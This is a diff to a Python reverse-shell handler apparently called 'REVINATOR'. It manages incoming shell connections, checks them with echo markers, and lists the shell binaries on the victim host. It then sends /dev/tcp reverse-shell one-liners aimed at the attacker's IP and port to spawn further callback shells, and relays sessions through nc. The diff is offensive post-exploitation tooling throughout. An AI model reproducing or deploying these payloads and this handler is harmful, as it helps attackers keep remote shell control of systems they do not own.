@@ -32,8 +32,10 @@ class connection:
         self.working_rev = ""
         self.cmd = False
         self.first = first
+        self.echo_command = None
+        self.conn.settimeout(0.1)
         if self.first:
-            print("FIRST")
+            self.echo_cmd_test()
             threading.Thread(target=self.set_rev).start()
 
 
@@ -41,15 +43,34 @@ class connection:
         self.recorded = ""
         self.cmd = True
         while self.cmd:
-            self.recorded += self.conn.recv(1024).decode()
+            try:
+                data = self.conn.recv(1024).decode()
+            except TimeoutError:
+                break
+            if data:
+                self.recorded += data
+            
+    def echo_cmd_test(self):
+        cmd = "echo HI_REVINATOR\r"
+        self.conn.send(cmd.encode())
+
+        #threading.Thread(target=self.rcv_stream).start()
+        self.rcv_stream()
+
+        #time.sleep(0.1)
+        self.cmd = False
+
+        self.echo_command = self.recorded.count("echo HI_REVINATOR")
 
     def send_rcv(self, cmd):
+
         cmd += "; echo REVINATOR_COMPLETE\r"
         self.conn.send(cmd.encode())
 
-        threading.Thread(target=self.rcv_stream).start()
-        while self.recorded.count("REVINATOR_COMPLETE") < 2:
-            time.sleep(0.1)
+        #threading.Thread(target=self.rcv_stream).start()
+        self.rcv_stream()
+        #while self.recorded.count("REVINATOR_COMPLETE") < self.echo_command + 1:
+        #    time.sleep(0.1)
 
         self.cmd = False
         return self.recorded
@@ -60,12 +81,10 @@ class connection:
         for rev in self.rev:
             num = num_cons
             self.conn.send(rev.encode())
-            time.sleep(2)
+            time.sleep(0.2)
             if num_cons > num:
                 self.working_rev = rev
-                print("REV = " + rev)
                 return
-        print("NO REVS FOUND")
             
 
 
@@ -75,8 +94,7 @@ class connection:
         self.send_rcv("find /bin/ /usr/bin/")
 
         bins = self.recorded.split("\n")
-        #print(bins)
-        shells = ["sh","bsh","csh","bash","ksh","zsh","pdksh","tcsh","mksh","dash"]
+        shells = ["dash","bash","sh","bsh","csh","ksh","zsh","pdksh","tcsh","mksh"]
         
 
 
@@ -95,12 +113,12 @@ class connection:
         for shell in shells:
             sh = f"/bin/{shell}"
             if sh in bins:
-                self.rev.append(f"{sh} -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r")
                 self.rev.append(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {sh} <&196 >&196 2>&196 & \r")
+                self.rev.append(f"{sh} -i >& /dev/tcp/{IP}/{PORT} 0>&1 \r")
             sh = f"/usr/bin/{shell}"
             if sh in bins:
-                self.rev.append(f"{sh} -i >& /dev/tcp/{IP}/{PORT} 0>&1 & \r")
                 self.rev.append(f"0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; {sh} <&196 >&196 2>&196 & \r")
+                self.rev.append(f"{sh} -i >& /dev/tcp/{IP}/{PORT} 0>&1 \r")
 
 
         self.test_revs()
@@ -108,6 +126,7 @@ class connection:
         print(f"{len(unique_addresses)}:\t{self.addr}")
         #new_rev[self.addr] = self.rev
         self.record = False
+        self.conn.settimeout(None)
 
 
     def create_new(self):
@@ -117,6 +136,7 @@ class connection:
 
         self.sock = sock[0]
         self.connected = True
+        self.conn.setblocking(True)
         threading.Thread(target=self.in_stream).start()
         threading.Thread(target=self.out_stream).start()
 
@@ -125,15 +145,21 @@ class connection:
     def in_stream(self):
         while True:
             data = self.conn.recv(1024)
-            if data:
+            if data and len(data) > 0:
+                #print(data)
                 self.sock.sendall(data)
+            else:
+                time.sleep(0.1)
 
 
     def out_stream(self):
         while True:
             data = self.sock.recv(1024)
-            if data:
+            if data and len(data) > 0:
+                #print(data)
                 self.conn.sendall(data)
+            else:
+                time.sleep(0.1)
     
 
 
@@ -160,7 +186,7 @@ def new_window(ip):
 def remote(ip):
     wd = (f"/tmp/{ip}")
     global PORT, IP
-    os.system(f"/bin/bash -c '(printf {ip}; cat) | nc 127.0.0.1 {PORT}'")
+    os.system(f"(printf {ip}; cat) | nc 127.0.0.1 {PORT}")
     quit()
 
 
@@ -216,6 +242,7 @@ def run(quiet_mode=False):
                 else:
                     managed_connections.append(connection(connections[-1]))
                 
+                
 
                 if not latest in addresses:             # if unique address
                     id = len(unique_addresses)
@@ -229,10 +256,11 @@ def run(quiet_mode=False):
                     if not quiet_mode:
                         threading.Thread(target=run_t,args=(id,)).start()
                 
-                for w in waitingl:                      # if user is waiting to connect
-                    if managed_connections[-1].addr == w[0]:
-                        managed_connections[-1].connect(w[1])
-                        waitingl.remove(w)
+            for w in waitingl:                      # if user is waiting to connect
+                if managed_connections[-1].addr == w[0]:
+                    managed_connections[-1].connect(w[1])
+                    waitingl.remove(w)
+
 
 
 
